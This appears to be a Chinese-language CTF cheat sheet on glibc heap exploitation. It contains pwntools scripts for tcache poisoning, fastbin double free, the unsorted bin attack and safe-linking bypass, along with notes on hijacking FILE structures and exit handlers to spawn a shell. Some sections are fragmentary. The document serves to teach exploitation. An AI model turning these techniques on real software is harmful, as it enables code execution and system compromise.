

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# 或 strings
strings ./libc.so.6 | grep "GNU C Library"
```

|-----------|---------|------|

## tcache poisoning (2.27 - 2.31)


```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# 申请大于 tcache 范围的 chunk（>0x408），free 进 unsorted bin，残留 main_arena 指针
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # 防止合并
for i in range(7):
    free(i)
free(7)       # 第 8 个进 unsorted bin，fd/bk 指向 main_arena+96
add(9, 0x80)  # 切回来一部分，保留 fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 偏移，glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → 写 __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# 用 UAF 改 chunk11 的 fd 指向 __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # 取出 chunk11
add(13, 0x30, p64(libc.sym['system']))  # 取出来的就是 __free_hook 地址，写 system

# 触发：free 一个内容为 "/bin/sh\x00" 的 chunk
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```


```text
原理：tcache/fastbin 的 fd 写入时被 PROTECT_PTR 异或：
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

绕过：
1. 必须先 leak 一个堆地址（heap base）
2. 计算 obfuscated 值：fake_fd_obf = (chunk_addr >> 12) ^ target
3. 写进去
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base（unsorted bin 残留 / tcache fd 残留）
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```


```text
关键点：
1. fastbin 单链表（只有 fd），无 size 检查除了 chunk size 必须匹配
2. 2.27 后 tcache 优先，fastbin 只有 tcache 满了才用
3. 仍然需要伪造一个看起来像 chunk 的内存（size 字段 = 真实 chunk size，± 一些）
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# 把 fd 改成 fake chunk（要求 fake_addr + 8 处的 size 字节匹配 0x70）
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # 取出 fake_addr 处的 chunk
```


```text
原理：写任意地址为 main_arena+88
2.29 起加了 bck->fd == victim 的检查，绕不过
用途：覆盖 global_max_fast 让小 chunk 也走 fastbin → 配合 fastbin attack
```

```python
# 申请 unsorted size chunk
add(0, 0x100)
add(1, 0x100)  # 防止 top consolidation
free(0)
# UAF 改 bk 指针为 target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
```

## large bin attack

```text
原理：large bin 比 unsorted 多一层 fd_nextsize / bk_nextsize
2.32 起也加了 chunk size 检查，但仍可用于改 global_max_fast、_IO_list_all 等
高级技巧，常用于 House of Husk 等组合拳
```


|------|---------|---------|
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |


```text
Step 1: leak heap base
  - 申请 chunk → free 到 tcache（2.32+ 保留 obfuscated fd） → show → 反推 heap
  - 或：申请大 chunk → free 到 unsorted → 切回 → show fd

Step 2: leak libc base
  - 大 chunk free 到 unsorted bin，fd/bk 残留 main_arena 地址
  - show → leak → libc.address = leak - main_arena_offset

Step 3: 控 IP
  - 2.27-2.33: tcache/fastbin poisoning → 写 __free_hook 或 __malloc_hook
  - 2.34+: FILE struct 攻击（_IO_2_1_stdout_ / stderr），改 vtable → _IO_wfile_jumps
  - 或：劫持 exit handlers（__exit_funcs / tls_dtor_list）

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```


```text
目标：当程序调用 puts/printf 时，最终走到 _IO_file_xsputn → _IO_OVERFLOW → 调用 vtable
劫持：
  1. 覆盖 _IO_2_1_stderr_ 的 vtable 指针指向伪造的 vtable
  2. 伪造 vtable，让 __overflow 字段指向 system 或 setcontext
  3. 让 fp（FILE*）本身的前 8 字节是 "/bin/sh\x00"（作为 system 的 rdi）
触发：任何 puts/printf/abort/exit 都会冲刷 stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
原理：__run_exit_handlers 遍历 __exit_funcs 链表，调用每个 dtor
劫持：改链表节点的 func 指针指向 system，arg 指向 "/bin/sh"
注意：2.34+ 加了 PTR_DEMANGLE，需要 leak tls 里的 fs:[0x30] guard 值才能伪造
```


```text
__call_tls_dtors 遍历，结构类似，同样要绕过 PTR_DEMANGLE
适用：程序退出时会走，比 FILE 攻击更通用
```


```text
# pwndbg
heap              # 显示当前 arena 所有 chunk
bins              # 显示 tcache / fastbin / unsorted / small / large bins
tcache            # 单独看 tcache
find_fake_fast <addr> <size>  # 找一个能用作 fake chunk 的 fd 写入点
vis_heap_chunks   # 可视化堆布局

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```


```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO 包装
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === 后续根据漏洞类型选择技术栈 ===
```
